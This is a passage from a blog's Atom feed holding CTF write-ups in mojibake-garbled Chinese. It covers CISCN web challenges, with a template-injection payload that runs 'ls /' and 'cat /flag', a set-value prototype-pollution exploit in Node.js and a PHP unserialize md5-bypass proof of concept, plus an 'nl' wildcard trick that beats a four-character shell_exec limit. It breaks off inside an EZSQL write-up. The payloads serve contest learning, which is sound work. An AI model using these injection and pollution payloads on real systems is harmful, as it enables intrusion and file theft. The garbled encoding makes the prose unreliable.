ç¯‡blogäº§ç”Ÿäº†è¯¯å¯¼ï¼Œæ­»æ´»è¦æ‹¿phpinfoçš„å›æ˜¾</p><p>ç›´æ¥ç”¨echo æ‰“å°ç›®å½•å¥½åƒä¹Ÿå¯ä»¥ï¼Œå†åŠ ä¸Šåå¼•å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œåå¼•å·çš„ä½œç”¨ç›¸å½“äºå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°åœ¨ç™½ç›’ä¸­è¢«banå®Œäº†ï¼Œä½†æ˜¯åå¼•å·æ›´å¥½ç”¨ï¼Œåå¼•å·ç›¸å½“äºå‘½ä»¤æ‰§è¡Œå‡½æ•°å¹¶ä¸”èƒ½æŠŠæ‰§è¡Œç»“æœè¿”å›</p><p>ç”±äºå®¹å™¨å…³äº†å°±ç»™pocå§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)echo(&#96;ls &#x2F;&#96;);&#x2F;&#x2F;&#125;&#123;end%20if&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ ¹ç›®å½•ä¸‹é¢ä¼šå‘ç°flagæ–‡ä»¶ï¼Œç”¨catè¯»å–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ï¼Ÿa&#x3D;&#123;if:1)echo(&#96;cat &#x2F;flag&#96;);&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/6.png" class=""><h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><h3 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>nodejsåŸç”Ÿé“¾æ±¡æŸ“</li><li><code>set-value</code>çš„åŸå‹é“¾æ±¡æŸ“æ¼æ´</li></ul><h3 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>é¢˜ç›®ç»™äº†é™„ä»¶ï¼Œè§£å‹æ‹–åˆ°sublineé‡Œ,çœ‹äº†è€åŠå¤©å‘ç°åªç”¨çœ‹ä¸‹é¢è¿™ä¸¤ä¸ªæ–‡ä»¶å°±å¯ä»¥äº†</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/7.png" class=""><p>nodejsåŸºæœ¬ä¸å¤ªä¼šï¼Œå…ˆæ‰¾äº†ç¯‡æ–‡ç« çœ‹çœ‹åŸå‹é“¾æ±¡æŸ“çš„åŸç†ï¼Œç®€å•æ¥è¯´å°±æ˜¯è¦åˆ©ç”¨åˆ°<code>__proto__</code>å±æ€§ï¼Œä¸‹é¢æ˜¯æ–‡ç« é‡Œæ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†</p><p>ç»§æ‰¿çš„æŸ¥æ‰¾è¿‡ç¨‹:</p><p>â€ƒâ€ƒè°ƒç”¨å¯¹è±¡å±æ€§æ—¶, ä¼šæŸ¥æ‰¾å±æ€§ï¼Œå¦‚æœæœ¬èº«æ²¡æœ‰ï¼Œåˆ™ä¼šå»<code>__proto__</code>ä¸­æŸ¥æ‰¾ï¼Œä¹Ÿå°±æ˜¯æ„é€ å‡½æ•°çš„æ˜¾å¼åŸå‹ä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ„é€ å‡½æ•°ä¸­ä¹Ÿæ²¡æœ‰è¯¥å±æ€§ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œä¹Ÿæœ‰<code>__proto__</code>ï¼Œé‚£ä¹ˆä¼šå»<code>__proto__</code>çš„æ˜¾å¼åŸå‹ä¸­æŸ¥æ‰¾ï¼Œä¸€ç›´åˆ°null</p><p>åˆ°è¿™é‡ŒåŸç†å·®ä¸å¤šäº†ï¼Œä¸‹é¢å°±æ˜¯åˆ†æäº†</p><p>åœ¨çœ‹åˆ°<code>const setFn = require(&#39;set-value&#39;);</code>ä¸æ˜¯å¾ˆç†è§£ï¼Œgoogleçš„æ—¶å€™æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« </p><p><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p><p>æ–‡ç« é‡Œçš„pocæ²¡ææ‡‚åˆ°åº•é‡å†™äº†å•¥ï¼Œæœ‰æ²¡æœ‰é‡å†™ï¼Œä½†æ˜¯çŸ¥é“çš„æ˜¯å¾—ä»setFn()å…¥æ‰‹ï¼Œç›´æ¥è·Ÿè¿›setFn()</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/8.png" class=""><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œåœ¨è®¿é—®/Privilegeæ—¶ï¼Œå¯ä»¥ä¼ å…¥èµ‹å€¼keyå’Œvalue</p><p>ä¸‹é¢å°±æ˜¯è·Ÿè¿›setFn()çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°session()ï¼Œåœ¨app.jsä¸­æœ‰ä¸‹é¢å¯¹Sessionçš„å‚æ•°å®šä¹‰</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/9.png" class=""><p>è¿™é‡Œæœ‰envï¼ŒæŸ¥ä¸€ä¸‹æ„æ€å°±æ˜¯ç¯å¢ƒå˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ±¡æŸ“çš„åº”è¯¥å°±æ˜¯Sessionäº†ï¼Œsessionåˆåœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™é‡Œå°±æ˜¯ä¸€ä¸ªé‡è¦ç‚¹ï¼Œå…ˆæ”¾ç€</p><p>ä¸‹é¢å†æ¥çœ‹ä¸€ä¸‹è·å–flagçš„æ¡ä»¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">"/DeveloperControlPanel"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"Wrong password!Are you Admin?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Admin[key]çš„å€¼å’Œpasswordçš„å€¼åªè¦èƒ½å¤Ÿç›¸ç­‰ï¼Œå°±ä¼šç»™åˆ°åœ¨ç¯å¢ƒå˜é‡ä¸­çš„flagï¼Œè¿™é‡Œ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password1"</span>:process.env.p1,</span><br><span class="line">    <span class="string">"password2"</span>:process.env.p2,</span><br><span class="line">    <span class="string">"password3"</span>:process.env.p3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Adminçš„å®šä¹‰ä¹Ÿæ˜¯åœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œæ‰€ä»¥æ²¡åŠæ³•ç”¨åŸå‹é“¾æ±¡æŸ“è¦†ç›–ï¼Œç”¨ä¸Šé¢åˆ†æçš„å¾€ç¯å¢ƒå˜é‡ä¸­å†™å…¥</p><p>åˆå› ä¸º<strong>æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡åœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalue</strong></p><p>æ‰€ä»¥æˆ‘çŒœæµ‹æ±¡æŸ“sessionå†™å…¥ç¯å¢ƒå˜é‡ï¼Œåœ¨åˆ¤æ–­æ—¶æ‰¾ä¸åˆ°Adminä¸­å¯¹åº”çš„å€¼æ—¶ä¼šç»§ç»­å‘å‰æ‰¾ï¼Œä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„sessionï¼Œç°åœ¨æ•´ä¸ªæ€è·¯åº”è¯¥å°±æ¸…æ™°äº†ï¼Œä¸Špoc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Privilege</span><br><span class="line"></span><br><span class="line">POSTï¼šNewAttributeKey&#x3D;__proto__.peguin&amp;NewAttributeValue&#x3D;123</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/10.png" class=""><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå†™åˆ°äº†ç¯å¢ƒå˜é‡ä¸­ï¼Œå¹¶ä¸”ä¼šç”Ÿæˆæ–°çš„é”®å€¼å¯¹ï¼Œæˆ‘çŒœæµ‹åº”è¯¥æ˜¯è¿™ç§æ ¼å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; __proto__: &#123; peguin: 123 &#125; &#125;</span><br></pre></td></tr></table></figure><p>yå› ä¸ºAdminæœ¬èº«æ²¡æœ‰è¿™ä¸ªå±æ€§ï¼Œå°±ä¼šå»<code>__proto__</code>ä¸­æŸ¥æ‰¾ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬åªè¦å»postä¼ å‚keyä¸ºpeguinï¼Œvalueä¸º123å°±å¯ä»¥äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;DeveloperControlPanel</span><br><span class="line"></span><br><span class="line">postï¼škey&#x3D;peguin&amp;password&#x3D;123</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/11.png" class=""><h2 id="Easytrick"><a href="#Easytrick" class="headerlink" title="Easytrick"></a>Easytrick</h2><p>è¿™é¢˜æ²¡åšå‡ºæ¥æŒºé—æ†¾çš„ï¼Œèµ›åå¤ç°ä¸€ç‚¹ä¸éš¾ï¼Œä¹‹å‰æ¥è§¦è¿‡çš„ç‚¹</p><h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>æ•´å‹å’Œå­—ç¬¦ä¸²ç²¾åº¦é—®é¢˜</li></ul><h3 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ç»™æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ä½ å¤ªé•¿äº†"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦åœ¨æœ¬åœ°æµ‹è¯•ï¼Œç»è¿‡æµ‹è¯•æ²¡æœ‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;trick1 &#x3D; (string)$this-&gt;trick1;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±èƒ½ç”¨æ•°ç»„ç›´æ¥ç»•è¿‡ï¼Œé—®é¢˜æ˜¯å¤šäº†è¿™ä¸€ä¸ªç‚¹ï¼Œæ¯”èµ›æ—¶å°±æ²¡è€ƒè™‘åˆ°ï¼Œèµ›åçªç„¶æƒ³åˆ°äº†ä¹‹å‰è¿™ä¸ªè€ƒç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1.000000000000001</span>;</span><br><span class="line">$b = <span class="number">1.000000000000001</span>;</span><br><span class="line">$a = (string)($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(strlen($a)&gt;<span class="number">5</span>||strlen($b)&gt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"you are too long"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> md5($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>($a!==$b&amp;&amp;$a!=$b&amp;&amp;md5($a)==md5($b))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"good"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/12.png" class=""><p>ç»•è¿‡äº†ï¼Œç›´æ¥ç¼–poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1.000000000000001</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1.000000000000001</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>æŠŠç”Ÿæˆå¾—æ•°æ®ä¼ ç»™trickå°±å¯ä»¥</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/13.png" class=""><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>çŸ¥è¯†ç‚¹</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€
    
    </summary>
    
    
    
      <category term="CISCN" scheme="http://yoursite.com/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>NLcommand</title>
    <link href="http://yoursite.com/2020/08/18/NLcommand/"/>
    <id>http://yoursite.com/2020/08/18/NLcommand/</id>
    <published>2020-08-18T15:08:16.000Z</published>
    <updated>2020-08-18T15:33:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ã€nlã€‘éš¾äº†"><a href="#ã€nlã€‘éš¾äº†" class="headerlink" title="ã€nlã€‘éš¾äº†"></a>ã€nlã€‘éš¾äº†<a id="more"></a></h2><p>å¼€å§‹è¿™é“é¢˜ä¹‹å‰å…ˆæ¥çœ‹ç‚¹ä¾‹å­ï¼Œçœ‹å®Œå°±çŸ¥é“æ€ä¹ˆåšäº†</p><h3 id="nlå‘½ä»¤"><a href="#nlå‘½ä»¤" class="headerlink" title="nlå‘½ä»¤"></a>nlå‘½ä»¤</h3><p>nlå‘½ä»¤å…¶å®å°±æ˜¯linuxä¸‹è®¡ç®—æ–‡ä»¶ä¸­çš„è¡Œå·</p><img src="/2020/08/18/NLcommand/1.png" class=""><p>å¯ä»¥çœ‹åˆ°ä¸å•å•è¿”å›äº†è¡Œå·è¿˜è¿”å›äº†å¯¹åº”è¡Œå·çš„å†…å®¹</p><p>ä¸‹é¢å†æ¥çœ‹ä¸€ä¸ªå°å®éªŒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">&gt;nl</span><br><span class="line">&gt;a.txt</span><br><span class="line">vim a.txt</span><br><span class="line">*</span><br></pre></td></tr></table></figure><img src="/2020/08/18/NLcommand/2.png" class=""><p>å…ˆå°†nlå‘½ä»¤å†™å…¥æ–‡ä»¶å¤¹ï¼Œè¿™é‡Œç”¨åˆ°äº†é€šé…ç¬¦<code>*</code>,ä¼šå°†æ–‡ä»¶å¤¹ä¸‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åå½“ä½œbashå‘½ä»¤æ¥æ‰§è¡Œï¼Œå…¶ä»–æ–‡ä»¶åå…¨éƒ¨éƒ½æ˜¯å‚æ•°ï¼Œé€šè¿‡å†™å…¥nlï¼Œå†å†™å…¥æµ‹è¯•çš„æ–‡ä»¶ï¼Œè°ƒç”¨é€šé…ç¬¦å°±èƒ½è¯»å–è¯¥è·¯å¾„ä¸‹æ‰€æœ‰æ–‡ä»¶çš„è¡Œå·åŠå…¶å†…å®¹ï¼Œè¿™é“é¢˜ä¹Ÿæ˜¯è¿™æ ·</p><p>å…ˆæ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"hack!!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//by Firebasky</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°shellçš„é•¿åº¦ä¸èƒ½è¶…è¿‡4ä½ï¼Œè¶…è¿‡å°±ä¼šæŠ¥hack</p><p>è¿™é‡Œå°±ç”¨ä¸Šé¢çš„æ–¹æ³•ï¼Œå…ˆå†™å…¥<code>nl</code>ï¼Œå†ç”¨é€šé…ç¬¦è¯»å–å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;&gt;nl</span><br><span class="line">?1&#x3D;*</span><br></pre></td></tr></table></figure><p>å†æºç å¤„æ‰¾åˆ°flag</p><img src="/2020/08/18/NLcommand/3.png" class=""><p>é¡ºä¾¿å›é¡¾ä¹‹å‰æ•´ç†è¿‡çš„çŸ¥è¯†ï¼š</p><p>æ‹“å±•ï¼š</p><p>æ€è·¯ï¼šä»£æ›¿cat<br>cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</p><p>tac ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º</p><p>more æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹</p><p>less å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”è¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦</p><p>head åªæ˜¾ç¤ºå¤´å‡ è¡Œ</p><p>tail åªæ˜¾ç¤ºæœ€åå‡ è¡Œ</p><p>nl ç±»ä¼¼äºcat -nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå·</p><p>tailf ç±»ä¼¼äºtail -f</p><p>sort  å‘½ä»¤ç”¨äºå°†æ–‡æœ¬æ–‡ä»¶å†…å®¹åŠ ä»¥æ’åºã€‚</p><p>od  odæŒ‡ä»¤ä¼šè¯»å–æ‰€ç»™äºˆçš„æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶å°†å…¶å†…å®¹ä»¥å…«è¿›åˆ¶å­—ç å‘ˆç°å‡ºæ¥ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ã€nlã€‘éš¾äº†&quot;&gt;&lt;a href=&quot;#ã€nlã€‘éš¾äº†&quot; class=&quot;headerlink&quot; title=&quot;ã€nlã€‘éš¾äº†&quot;&gt;&lt;/a&gt;ã€nlã€‘éš¾äº†
    
    </summary>
    
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>DASfinaltest</title>
    <link href="http://yoursite.com/2020/08/15/DASfinaltest/"/>
    <id>http://yoursite.com/2020/08/15/DASfinaltest/</id>
    <published>2020-08-15T07:48:37.000Z</published>
    <updated>2020-08-16T16:16:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EZSQL"><a href="#EZSQL" class="headerlink" title="EZSQL"></a>EZSQL<a id="more"></a></h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>æ–‡ä»¶åŒ…å«</li><li>SQLæ³¨å…¥</li><li>phpä¼ªåè®®</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜ï¼Œurlå¤„å‘ç°å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œç”¨<code>filter://</code>åè®®å°è¯•è¯»å–ï¼ŒæˆåŠŸï¼Œæ‹¿åˆ°æºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span 